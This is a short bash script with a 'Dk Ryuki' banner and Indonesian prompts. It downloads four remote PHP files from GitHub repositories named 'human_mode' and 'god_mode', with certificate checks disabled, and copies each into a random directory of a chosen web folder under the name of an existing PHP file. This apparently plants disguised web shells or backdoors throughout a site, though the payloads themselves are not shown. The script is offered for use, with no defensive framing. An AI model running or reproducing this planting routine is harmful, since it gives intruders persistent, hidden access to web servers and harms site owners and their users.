#!/bin/bash

echo oooooo    o  o
echo o     o   o o
echo o      o  oo
echo o      o  o o
echo o     o   o  o
echo oooooo    o   o
echo [Dk Ryuki]
echo Silahkan masukan nama folder:
read varname
echo Directory yg di tuju: $varname
mkdir x
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/content.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/cok2.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/revisi.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/god_mode/main/task.php

for i in $(ls -l x/ |awk '{print $9}'|sed '/^$/d')
do
        myfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
        mydir=$(find $varname -type d | shuf -n 1)
        if [ ! -f $mydir/$myfile ]
        then
                cp x/$i $mydir/$myfile
                echo $mydir/$myfile
        else
                xmyfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
                xmydir=$(find $varname -type d | shuf -n 1)
                if [ ! -f $xmydir/$xmyfile ]
                then
                        cp x/$i $xmydir/$xmyfile
                        echo $xmydir/$xmyfile
                fi
        fi
done
rm -rf x
